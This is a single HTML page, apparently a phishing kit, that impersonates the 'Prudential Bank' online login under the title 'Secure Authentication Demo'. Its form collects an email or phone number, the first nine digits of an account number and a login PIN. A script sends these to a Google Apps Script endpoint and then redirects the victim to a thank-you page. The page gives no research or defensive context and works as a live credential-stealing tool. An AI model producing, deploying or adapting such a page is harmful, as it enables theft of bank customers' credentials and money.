<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Authentication Demo</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f7f7f7; display: flex; flex-direction: column; align-items: center; }
    .header { background: linear-gradient(135deg, #1e3c72, #2a5298); color: #fff; text-align: center; width: 100%; padding: 40px 20px; border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; }
    .header h1 { margin: 0; font-size: 22px; } .header p { margin: 5px 0 0; font-size: 14px; }
    .login-container { background: #fff; width: 90%; max-width: 360px; margin-top: -30px; padding: 30px 25px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    label { display: block; margin-bottom: 6px; font-size: 14px; color: #333; }
    input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
    .button-group { display: flex; justify-content: center; }
    .button-group button { padding: 12px 20px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; background: linear-gradient(135deg, #1e3c72, #2a5298); color: #fff; }
    .button-group button:hover { background: linear-gradient(135deg, #162447, #1f4068); }
  </style>
</head>
<body>
  <div class="header">
    <h1>Welcome to the Prudential Bank Online Platform </h1>
    <p> Secure your PBL Services Below </p>
  </div>

  <div class="login-container">
    <form id="authForm">
      <label>Email or Phone</label><input type="email" name="email" placeholder="Enter your email or phone number" required>
      <label>User ID</label><input type="text" name="userId" placeholder="Enter first 9 digits of your ACC NO." required>
      <label>Login PIN</label><input type="password" name="pin" placeholder="Enter your PIN" required>
      <div class="button-group"><button type="submit">Validate Account â†’</button></div>
    </form>
  </div>

  <script>
    document.getElementById('authForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const params = new URLSearchParams(new FormData(e.target));
      try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbzv-M-i3ZgHE3IN-q1CnnmSrJh3_26l8sKnoMkl_kpvYnAh8hX7K70xzNIwrZhK7YKm/exec", { method: "POST", body: params });
        if (response.ok) {
          window.location.href = "thank_you.html";
        } else {
          alert("Submission failed. Please try again.");
        }
      } catch (err) {
        console.error(err);
        alert("Error: " + err.message);
      }
    });
  </script>
</body>
</html>
